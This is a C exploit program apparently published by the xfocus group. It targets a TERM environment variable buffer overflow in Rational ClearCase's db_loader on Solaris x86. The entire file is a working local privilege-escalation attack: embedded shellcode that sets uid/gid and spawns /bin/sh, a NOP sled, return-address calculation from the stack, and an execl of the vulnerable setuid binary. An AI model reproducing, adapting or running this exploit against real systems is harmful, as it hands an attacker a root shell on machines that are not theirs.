/* Rational ClearCase TERM environment variable buffer overflow exploit
*  test it again solaris x86 7, bug found by virtualcat@xfocus.org
*  xploit by xundi@xfocus.org
*  website: http://xfocus.org
*/

#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define    RET_DIS            550
#define    NOP            0x90
#define    NNOP            512

#define    ENV_VAR            "TERM"

#define    USER_UPPER_MAGIC    0x08047fff

/* Shell code taken from Pablo Sor's "mailx -F" exploit code    */
char shellCode[] =
    "\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4"
    "\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf"
    "\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff"
    "\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53"
    "\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f"
    "\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff";


int get_esp()
{
    __asm__("mov %esp,%eax");
}

int  getEnvAddr(const char* envPtr)
{
    int    envAddr = NULL;
    int    retCode = 0;

    char* charPtr = (char *) get_esp();

    /* Search for the starting address of the environment string for    */
    /* the specified environment variable                    */
    while((unsigned int)  charPtr < (unsigned int) USER_UPPER_MAGIC)
    {
        retCode = memcmp((unsigned char *) charPtr++, envPtr, 4);
        /* Found */
        if(retCode == 0)
        {
            envAddr = (int) (charPtr - 1);
            break;
        }
    }

    return envAddr;
}

int main(int argc, char** argv)
{

    char    buff[256] = {0};

    int*    intPtr = NULL;
    char*    buffPtr = NULL;
    char*    charPtr = NULL;

    int    retAddr = 0;
    int    retValue = 0;


    int    buffLen = 0;
    int    adjustment = 0;
    int    strLen = 0;
    int    alignment = 0;
    int    diff = 0;
    int    i;

    int shellCodeLen = strlen(shellCode);

    if(argc == 2)
    {
        adjustment = atoi(argv[1]);
    }

    buffLen = strlen(ENV_VAR) + RET_DIS + NNOP + shellCodeLen + 1;

    charPtr = getenv(ENV_VAR);

    /* Adjust the stupid alignment    */
    strLen = strlen(charPtr) + 1;
    alignment = strLen % 4;
    if(alignment != 0)
    {
        alignment = 4 - alignment;
        strLen += alignment;
    }

    alignment = buffLen % 4;
    if(alignment != 0)
    {
        alignment = 4 - alignment;
        buffLen += alignment;
    }

    retValue = getEnvAddr(ENV_VAR);

    diff = buffLen - strLen;

    retAddr = retValue - diff + strlen(ENV_VAR) + 1;

    alignment = retAddr % 4;

    if(alignment != 0)
    {
        alignment = 4 - alignment;
    }
    retAddr += RET_DIS + alignment +  adjustment;

    /* Allocate memory for the evil buffer    */
    buffPtr = (char *) malloc(buffLen);

    if(buffPtr != NULL)
    {

        strcpy(buffPtr, ENV_VAR);
        strcat(buffPtr, "=");
        charPtr = (char *) (buffPtr + strlen(buffPtr));

        /* Fill the rest of the buffer with 'A'     */
        memset(charPtr, 0x41, buffLen - strlen(buffPtr)-4);

        /* Butt in the return address            */
        intPtr = (int *) (charPtr + RET_DIS);
        *intPtr++ = retAddr;

        /* Make sure the NOPs are located word aligned     */
        charPtr = (char *) intPtr;
        charPtr += alignment;

        for(i=0; i<NNOP; i++)
        {
            *charPtr++ = NOP;
        }

        for(i=0; i<shellCodeLen; i++)
        {
            *charPtr++ = shellCode[i];
        }
        *charPtr = 0;

        putenv(buffPtr);

        printf("Jumping to 0x%.8x\n", retAddr);

        execl("/usr/atria/etc/db_loader", "xfocus", NULL);
    }
    else
    {
        printf("No more free memory!");
    }
}

/*..Thanks for all xfocus members.. especially virtualcat*/
